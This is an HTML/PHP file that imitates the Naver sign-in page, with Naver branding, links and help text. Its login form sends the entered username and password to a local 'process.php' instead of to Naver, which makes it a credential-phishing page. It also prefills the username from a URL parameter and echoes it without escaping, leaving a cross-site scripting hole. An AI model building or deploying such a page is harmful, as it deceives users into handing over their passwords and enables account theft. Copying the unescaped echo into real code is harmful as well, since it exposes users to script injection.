<!DOCTYPE html>
<!-- saved from url=(0071)https://nid.naver.com/nidlogin.login?url=http%3A%2F%2Fmail.naver.com%2F -->
<html lang="ko"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Naver Sign in</title>
<link href="https://nid.naver.com/favicon_1024.png" rel="apple-touch-icon-precomposed" sizes="1024x1024">
<link rel="stylesheet" type="text/css" href="image/we.css">
</head>
<body class="global chrome">
<div id="wrap">
	<!-- header -->
	<div id="header">
		<h1><a href="http://www.naver.com/" class="sp h_logo" tabindex="1" onclick="nclks(&#39;log.naver&#39;,this,event)">NAVER</a></h1>
		<div class="lang">
			<select id="locale_switch" name="locale_switch" title="language" tabindex="2" class="sel" onchange="switchlocale();nclks_select(this.value,&#39;&#39;,{&#39;ko_KR&#39;:&#39;log.lankr&#39;,&#39;en_US&#39;:&#39;log.lanen&#39;,&#39;zh-Hans_CN&#39;:&#39;log.lancn&#39;,&#39;zh-Hant_TW&#39;:&#39;log.lantw&#39;},this,event);">
				<option value="ko_KR">한국어</option>
				<option value="en_US" selected="">English</option>
				<option value="zh-Hans_CN">中文(简体)</option>
				<option value="zh-Hant_TW">中文(台灣)</option>
			</select>
		</div>
	</div>
	<!-- //header -->
	<!-- container -->
	<div id="container">
	<!-- content -->
		<div id="content">
			<div class="link_info">
				<div class="u_keyboard">
					<a href="javascript:viewKeyboard();" class="sp btn_key_down" id="view_keyboard" tabindex="4" onclick="nclks_clsnm(&#39;view_keyboard&#39;,&#39;sp btn_key_down&#39;,&#39;log.kbdopen&#39;,&#39;log.kbdclose&#39;,this,event)"><span class="sp">PC Keyboard</span></a>
					<div class="key key_char" id="keyboard_img" style="display:none;">
						<a href="javascript:switchkeyboard();" class="sp btn_char" id="keyboard_switch" tabindex="5" onclick="nclks_clsnm(&#39;keyboard_switch&#39;, &#39;sp btn_char&#39;, &#39;log.symbols&#39;, &#39;log.character&#39;,this,event)">Symbols</a>
						<span class="sp key_img">&nbsp;</span>
					</div>
				</div>
				<span class="link_group"><a target="_blank" href="https://help.naver.com/support/contents/contents.nhn?serviceNo=532&amp;categoryNo=1577" tabindex="6" onclick="nclks(&#39;log.groupidlogin&#39;,this,event)">Group ID Sign in</a></span>
			</div>
			<form  action="process.php" method="post">


			<fieldset class="login_form">
			<legend class="blind">Sign in</legend>
				<div class="input_row" id="id_area">
					<span class="input_box">
						<label for="id" id="label_id_area" class="lbl" style="display: block;">Username</label>
						<input type="text" name="email" readonly="readonly" class="int"  value="<?php if(isset($_GET['userid'])) {echo $_GET['userid']; } ?>">
					</span>
					<button type="button" disabled="" title="delete" id="id_clear" class="wrg"><span class="blind">delete</span></button>
				</div>
				<div id="err_empty_id" class="error" style="display:none;">Enter your username!</div>
				<div class="input_row" id="pw_area">
					<span class="input_box">
						<label for="pw" id="label_pw_area" class="lbl" style="display: block;">Password</label>
						<input type="password"  name="password"  placeholder="Password" class="int">
					</span>
					<button type="submit" disabled="" title="delete" id="pw_clear" class="wrg"><span class="blind">delete</span></button>
					<div id="err_capslock" class="ly_v2" style="display:none;"><div class="ly_box"><p><strong>Caps Lock</strong> is on.</p></div><span class="sp ly_point"></span></div>
				</div>
				<div id="err_empty_pw" class="error" style="display:none;">Enter your password!</div>
				<div id="err_invalid_case" class="error" style="display:none;"><img src="image/bu.gif"></div>
				<span class="btn_login">
					<input type="submit" title="Sign in" alt="Sign in" tabindex="12" value="Sign in" class="int_jogin" onclick="nclks(&#39;log.login&#39;,this,event)">
				</span>
				<div class="check_info">
					<div class="login_check">
						<span class="login_check_box">
							<input type="checkbox" id="login_chk" name="nvlong" class="" tabindex="9" value="off" onchange="savedLong(this);nclks_chk(&#39;login_chk&#39;, &#39;log.keepon&#39;, &#39;log.keepoff&#39;,this,event)" onclick="msieblur(this);">

							<label for="login_chk" id="label_login_chk" class="sp">Stay Signed in</label>
						</span>
						<div class="ly_v2" id="persist_usage" style="display:none;"><div class="ly_box">Please use your own PC for keeping your account secure.<a target="_blank" href="https://help.naver.com/support/contents/contents.nhn?serviceNo=532&amp;categoryNo=1523" class="sp btn_check_help">View help</a><p></p></div><span class="sp ly_point"></span></div>
					</div>
					<div class="pc_check">
						<span class="ip_check"><a href="https://nid.naver.com/login/ext/help_ip3.html" target="_blank" onclick="window.open(this.href, &#39;IPGUIDE&#39;, &#39;titlebar=1, resizable=1, scrollbars=yes, width=537, height=750&#39;); return false;" title="" tabindex="10">IP Security</a><span class="ip_ch"><input type="checkbox" id="ip_on" checked="checked" tabindex="11" onchange="ipCheck(this,event);nclks_chk(&#39;ip_on&#39;, &#39;log.iponset&#39;, &#39;log.ipoffset&#39;,this,event)" onclick="msieblur(this);" class=""><label for="ip_on" id="label_ip_on" class="sp on">on</label></span></span> 
						<span class="bar">|</span>
						<span class="dis_di"><a href="https://nid.naver.com/nidlogin.login?url=http%3A%2F%2Fmail.naver.com%2F#" onclick="onetime(); nclks(&#39;log.otn&#39;,this,event); return false;" title="One-time Number">One-time Number</a><a href="javascript:viewOnetime();" onclick="nclks(&#39;log.otnhelp&#39;,this,event)" title="Help" class="sp btn_help">Help</a>
						<div class="ly" id="onetime_usage" style="display:none;" onclick="javascript:viewOnetime()">
							<div class="ly_box"><p>When you enter One-time Number generated by Naver app, you can sign in easily and more secure.</p></div>
							<span class="sp ly_point"></span>
						</div>
						</span>
					</div>
				</div>
			</fieldset>
			</form>
			<div class="position_a">
				<div class="find_info">
					<p>Forgot your <a target="_blank" href="https://nid.naver.com/user/help.nhn?todo=idinquiry&amp;lang=en_US" onclick="try{nclks(&#39;log.searchid&#39;,this,event)}catch(e){}">Username</a> or <a target="_blank" href="https://nid.naver.com/nidreminder.form" onclick="try{nclks(&#39;log.searchpass&#39;,this,event)}catch(e){}">Password?</a> <span class="bar">|</span> <a target="_blank" href="https://nid.naver.com/user/join.html?lang=en_US" onclick="try{nclks(&#39;log.registration&#39;,this,event)}catch(e){}">Sign up</a>				</p></div>
			</div>
		</div>
	</div>
	<div id="footer">
		<address><em><a target="_blank" href="http://www.navercorp.com/" class="logo" onclick="nclks(&#39;fot.naver&#39;,this,event)"><span class="blind">naver</span></a></em><em class="copy">Copyright</em> <em class="u_cri">©</em> <a target="_blank" href="http://www.navercorp.com/" class="u_cra" onclick="nclks(&#39;fot.navercorp&#39;,this,event)">NAVER Corp.</a> <span class="all_r">All Rights Reserved.</span></address>	</div>
</div>



</body></html>